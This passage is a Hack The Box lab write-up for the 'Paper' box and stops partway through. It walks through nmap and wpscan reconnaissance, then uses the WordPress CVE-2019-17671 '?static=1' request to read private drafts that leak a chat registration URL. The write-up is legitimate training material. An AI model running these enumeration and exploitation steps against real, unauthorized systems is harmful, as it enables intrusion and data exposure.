<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
        <meta name="author" content="Matthieu Mezirard">
    
    <meta name="author" content="Matthieu Mezirard" />
    
        <meta name="description" content="This is an easy Linux box.">
    
    <title>
        
            
        
        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;paper#
    </title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="/main.css" />
    <link
        id="theme-light-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/light.css"
    />
    <link
        id="theme-dark-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/dark.css"
    />
    <script
        async
        src="https://eu.umami.is/script.js"
        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
    ></script>
    <script src="/js/theme-toggle.js"></script>
    <script src="/js/code-wrapper.js"></script>
    <script src="/js/code-indicator.js"></script>
</head>


    <body>
        <header>
    <div class="left">
        <a href="/">
    mmezirard
</a>

        <div class="socials">
    
        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/github.svg" alt="github" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/hackerone.svg" alt="hackerone" />
        </a>
    
</div>

    </div>
    <div class="right">
        <nav>
    <ul>
        
            <li>
                <a href="&#x2F;htb-write-ups">
                    &#x2F;htb-write-ups
                </a>
            </li>
        
    </ul>
</nav>

        <button onclick="toggleTheme()">
    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
</button>
<script src="/js/theme-toggle.js"></script>

    </div>
</header>

        
    <main>
        
<article>
    <div>
        
    
        <div class="page-h1">
            Paper<span>.</span>
        </div>
    


        <div class="page-metadata">
            
                Posted on <time>2023-12-16</time>
            
        </div>

        
            <img
                class="page-cover"
                alt="cover.png"
                src="https://mmezirard.github.io/htb-write-ups/boxes/paper/cover.png"
            />
        
    </div>

    
        <h1>Table of Contents</h1>
        <ul>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#information">Information</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#setup">Setup</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#host-10-10-11-143">Host 10.10.11.143</a>
                    
                        <ul>
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#scanning">Scanning</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#ports">Ports</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#fingerprinting">Fingerprinting</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#scripts">Scripts</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#services-enumeration">Services enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#apache">Apache</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#foothold-ssh">Foothold (SSH)</a>
                                </li>

                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#getting-a-lay-of-the-land">Getting a lay of the land</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#architecture">Architecture</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#distribution">Distribution</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#kernel">Kernel</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#users">Users</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#groups">Groups</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#nics">NICs</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#hostname">Hostname</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#system-enumeration">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#flags">Flags</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#home-folders">Home folders</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#privilege-escalation-cve-2021-3560">Privilege escalation (CVE-2021-3560)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#checks">Checks</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#preparation">Preparation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#exploitation">Exploitation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#establishing-persistence">Establishing persistence</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#system-enumeration-1">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#flags-1">Flags</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                        </ul>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/paper/#afterwords">Afterwords</a>
                    
                </li>
            
        </ul>
    

    <section><h1 id="information">Information</h1>
<p><strong>Difficulty</strong>: Easy</p>
<p><strong>OS</strong>: Linux</p>
<p><strong>Release date</strong>: 2022-02-05</p>
<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/92926">secnigma</a></p>
<h1 id="setup">Setup</h1>
<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
<p>I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:</p>
<ol>
<li>
<p>I'll create a directory that will contain every file related to this box.
I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
<code>/</code>.</p>
</li>
<li>
<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
files in this folder available over the Internet, which will be especially
useful for transferring files to the target machine if need be!</p>
</li>
<li>
<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
This will come in handy once we get a foothold, for privilege escalation and
for pivoting inside the internal network.</p>
</li>
</ol>
<p>I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.</p>
<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.4</code>. The
commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
<p>Now we should be ready to go!</p>
<h1 id="host-10-10-11-143">Host <code>10.10.11.143</code></h1>
<h2 id="scanning">Scanning</h2>
<h3 id="ports">Ports</h3>
<p>As usual, let's start by initiating a port scan on Paper using a TCP SYN <code>nmap</code>
scan to assess its attack surface.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.143<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT    STATE SERVICE
</span><span class="z-text z-plain">22/tcp  open  ssh
</span><span class="z-text z-plain">80/tcp  open  http
</span><span class="z-text z-plain">443/tcp open  https
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Let's also check the 500 most common UDP ports.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.143<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h3 id="fingerprinting">Fingerprinting</h3>
<p>Following the ports scans, let's gather more data about the services associated
with the open TCP ports we found.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.143<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80,443<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT    STATE SERVICE  VERSION
</span><span class="z-text z-plain">22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
</span><span class="z-text z-plain">80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
</span><span class="z-text z-plain">443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>The version of Apache suggests that Paper might be running CentOS.</p>
<h3 id="scripts">Scripts</h3>
<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
additional information.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.143<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80,443<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT    STATE SERVICE
</span><span class="z-text z-plain">22/tcp  open  ssh
</span><span class="z-text z-plain">| ssh-hostkey: 
</span><span class="z-text z-plain">|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
</span><span class="z-text z-plain">|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
</span><span class="z-text z-plain">|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
</span><span class="z-text z-plain">80/tcp  open  http
</span><span class="z-text z-plain">| http-methods: 
</span><span class="z-text z-plain">|_  Potentially risky methods: TRACE
</span><span class="z-text z-plain">|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
</span><span class="z-text z-plain">|_http-title: HTTP Server Test Page powered by CentOS
</span><span class="z-text z-plain">443/tcp open  https
</span><span class="z-text z-plain">| tls-alpn: 
</span><span class="z-text z-plain">|_  http/1.1
</span><span class="z-text z-plain">|_ssl-date: TLS randomness does not represent time
</span><span class="z-text z-plain">|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
</span><span class="z-text z-plain">|_http-title: HTTP Server Test Page powered by CentOS
</span><span class="z-text z-plain">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
</span><span class="z-text z-plain">| Subject Alternative Name: DNS:localhost.localdomain
</span><span class="z-text z-plain">| Not valid before: 2021-07-03T08:52:34
</span><span class="z-text z-plain">|_Not valid after:  2022-07-08T10:32:34
</span><span class="z-text z-plain">| http-methods: 
</span><span class="z-text z-plain">|_  Potentially risky methods: TRACE
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h2 id="services-enumeration">Services enumeration</h2>
<h3 id="apache">Apache</h3>
<h4 id="exploration">Exploration</h4>
<p>Let's browse to <code>http://10.10.11.143/</code>.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/apache-homepage.png" alt="Apache homepage" /></p>
<p>It's the default installation page for Apache on CentOS.</p>
<h4 id="fingerprinting-1">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/apache-homepage-wappalyzer.png" alt="Apache homepage Wappalyzer extension" /></p>
<p>If we check the HTTP headers of the response, we also find a <code>X-Backend-Server</code>
header set to <code>office.paper</code>.</p>
<p>If we search online for this HTTP header, we find:</p>
<blockquote>
<p>The target website returns the <code>X-Backend-Server</code> header which includes
potentially internal/hidden IP addresses or hostnames.</p>
<p>— <a href="https://docs.gitlab.com/ee/user/application_security/dast/checks/16.4.html">GitLab</a></p>
</blockquote>
<p>Apparently, some proxy/load balancer providers reveal the <code>X-Backend-Server</code>
header value by default, which discloses the IP or the hostname of the target
website.</p>
<p>In this case, this reveals that there's an <code>office.paper</code> subdomain! I'll add it
to my <code>/etc/hosts</code> file.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.143 office.paper<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<h4 id="exploration-1">Exploration</h4>
<p>Let's browse to <code>http://office.paper/</code>:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/domain-homepage.png" alt="Domain homepage" /></p>
<p>Apparently, it's a blog for 'Blunder Tiffinc Inc.', the 'best paper company in
the eletric-city Scranton'.</p>
<h4 id="fingerprinting-2">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
<p>This reveals that this web page is using PHP version <code>7.2.24</code>, MySQL and
WordPress version <code>5.2.3</code>.</p>
<h4 id="wordpress">WordPress</h4>
<p>Let's use <code>wpscan</code> to enumerate WordPress:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> wpscan<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>url</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://office.paper/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">[+] Headers
</span><span class="z-text z-plain"> | Interesting Entries:
</span><span class="z-text z-plain"> |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
</span><span class="z-text z-plain"> |  - X-Powered-By: PHP/7.2.24
</span><span class="z-text z-plain"> |  - X-Backend-Server: office.paper
</span><span class="z-text z-plain"> | Found By: Headers (Passive Detection)
</span><span class="z-text z-plain"> | Confidence: 100%
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] WordPress readme found: http://office.paper/readme.html
</span><span class="z-text z-plain"> | Found By: Direct Access (Aggressive Detection)
</span><span class="z-text z-plain"> | Confidence: 100%
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
</span><span class="z-text z-plain"> | Found By: Rss Generator (Passive Detection)
</span><span class="z-text z-plain"> |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
</span><span class="z-text z-plain"> |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] WordPress theme in use: construction-techup
</span><span class="z-text z-plain"> | Location: http://office.paper/wp-content/themes/construction-techup/
</span><span class="z-text z-plain"> | Last Updated: 2022-09-22T00:00:00.000Z
</span><span class="z-text z-plain"> | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
</span><span class="z-text z-plain"> | [!] The version is out of date, the latest version is 1.5
</span><span class="z-text z-plain"> | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
</span><span class="z-text z-plain"> | Style Name: Construction Techup
</span><span class="z-text z-plain"> | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...
</span><span class="z-text z-plain"> | Author: wptexture
</span><span class="z-text z-plain"> | Author URI: https://testerwp.com/
</span><span class="z-text z-plain"> |
</span><span class="z-text z-plain"> | Found By: Css Style In Homepage (Passive Detection)
</span><span class="z-text z-plain"> |
</span><span class="z-text z-plain"> | Version: 1.1 (80% confidence)
</span><span class="z-text z-plain"> | Found By: Style (Passive Detection)
</span><span class="z-text z-plain"> |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;Version: 1.1&#39;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] Enumerating Vulnerable Plugins (via Passive Methods)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[i] No plugins Found.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
</span><span class="z-text z-plain"> Checking Known Locations - Time: 00:00:03 &lt;============================================================================================================================================================&gt; (652 / 652) 100.00% Time: 00:00:03
</span><span class="z-text z-plain">[+] Checking Theme Versions (via Passive and Aggressive Methods)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[i] No themes Found.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
</span><span class="z-text z-plain"> Checking Known Locations - Time: 00:00:16 &lt;==========================================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:00:16
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[i] No Timthumbs Found.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] Enumerating Config Backups (via Passive and Aggressive Methods)
</span><span class="z-text z-plain"> Checking Config Backups - Time: 00:00:00 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[i] No Config Backups Found.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] Enumerating DB Exports (via Passive and Aggressive Methods)
</span><span class="z-text z-plain"> Checking DB Exports - Time: 00:00:00 &lt;===================================================================================================================================================================&gt; (75 / 75) 100.00% Time: 00:00:00
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[i] No DB Exports Found.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)
</span><span class="z-text z-plain"> Brute Forcing Attachment IDs - Time: 00:00:13 &lt;========================================================================================================================================================&gt; (100 / 100) 100.00% Time: 00:00:13
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[i] No Medias Found.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] Enumerating Users (via Passive and Aggressive Methods)
</span><span class="z-text z-plain"> Brute Forcing Author IDs - Time: 00:00:04 &lt;==============================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:04
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[i] User(s) Identified:
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] prisonmike
</span><span class="z-text z-plain"> | Found By: Author Posts - Author Pattern (Passive Detection)
</span><span class="z-text z-plain"> | Confirmed By:
</span><span class="z-text z-plain"> |  Rss Generator (Passive Detection)
</span><span class="z-text z-plain"> |  Wp Json Api (Aggressive Detection)
</span><span class="z-text z-plain"> |   - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
</span><span class="z-text z-plain"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
</span><span class="z-text z-plain"> |  Login Error Messages (Aggressive Detection)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] nick
</span><span class="z-text z-plain"> | Found By: Wp Json Api (Aggressive Detection)
</span><span class="z-text z-plain"> |  - http://office.paper/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
</span><span class="z-text z-plain"> | Confirmed By:
</span><span class="z-text z-plain"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
</span><span class="z-text z-plain"> |  Login Error Messages (Aggressive Detection)
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">[+] creedthoughts
</span><span class="z-text z-plain"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
</span><span class="z-text z-plain"> | Confirmed By: Login Error Messages (Aggressive Detection)
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h4 id="exploration-2">Exploration</h4>
<p>There's a few blog posts written by <code>Prisonmike</code>: in the first one he declares
that he added all of his friends on this blog, and in the last one he says that
<code>Jan</code> forced him to remove all of them.</p>
<p>In the last blog post, <code>nick</code> also posted a comment to report to Michael
(<code>Prisonmike</code>) that he should remove the secrets in his drafts.</p>
<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>Wordpress 5.2.3</code>, we
find
<a href="https://www.exploit-db.com/exploits/47690">WordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts</a>
(<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17671">CVE-2019-17671</a>).</p>
<p>Since we know that Michael has secrets in his drafts, this might give us
critical information!</p>
<h4 id="retrieving-the-wordpress-drafts">Retrieving the WordPress drafts</h4>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17671">CVE-2019-17671</a> is an
information disclosure vulnerability affecting WordPress versions up to <code>5.2.3</code>
allowing unauthenticated users to view certain content that should be
restricted, like drafts and password protected blog posts. The vulnerability
arises from an improper handling of the <code>static</code> HTTP GET parameter.</p>
<p>Your can read more about it on
<a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">0day</a>.</p>
<p>In fact, it's extremely simple to exploit this vulnerability: we simply have to
browse to <code>http://office.paper/?static=1</code>.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/domain-homepage-cve-2019-17671.png" alt="Domain homepage CVE-2019-17671" /></p>
<p>Apparently, the users were removed from this website for security reasons. It
was a public blog, so the higher officials preferred migrating to a private chat
system.</p>
<p>There's also a 'Secret Registration URL of new Employee chat system':
<code>http://chat.office.paper/register/8qozr226AhkCHZdyY</code>. That's interesting! The
<code>chat.office.paper</code> subdomain is new. I'll add it to my <code>/etc/hosts</code> file.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.143 chat.office.paper<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>We can also see that Nick is once again blaming Michael for saving secrets in
drafts files, but Michael thinks that 'unpublished drafts cannot be accessed by
outsiders', so that it's alright.</p>
<h4 id="exploration-3">Exploration</h4>
<p>Let's browse to <code>http://chat.office.paper/</code>:</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-homepage.png" alt="Subdomain homepage" /></p>
<p>This is an instance of <a href="https://www.rocket.chat/">Rocket.Chat</a>. This must be the
'private chat system' mentioned earlier!</p>
<h4 id="fingerprinting-3">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-homepage-wappalyzer.png" alt="Subdomain homepage Wappalyzer extension" /></p>
<p>This reveals that this web page is using Node.js and MongoDB.</p>
<h4 id="exploration-4">Exploration</h4>
<p>The homepage indicates that registrations 'can only be done using the secret
registration URL'. Luckily, we got that URL thanks to Michael's drafts!</p>
<p>If we enter it, we can create an account.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-register-page.png" alt="Subdomain register page" /></p>
<p>I'll create a fake account with the username <code>dummy</code>.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-homepage-logged-in.png" alt="Subdomain homepage logged in" /></p>
<p>We only have access to a single channel, <code>#general</code>. Let's see what it contains.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/paper/subdomain-channel-page-general.png" alt="Subdomain channel page #general" /></p>
<p>If we scroll up the history of messages, we see the mention of a <code>recyclops</code> bot
that we can use to retrieve the content of files in the <code>Sales</code> folder.</p>
<p>The problem is that this channel is read-only. But if we read carefully the
messages, <code>kellylikescupcakes</code> mentions that we can interact with it through
direct messages!</p>
<p>I'll send him a <code>help</code> message:</p>
<pre class="z-code"><code><span class="z-text z-plain">Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">Most frequently asked questions include:
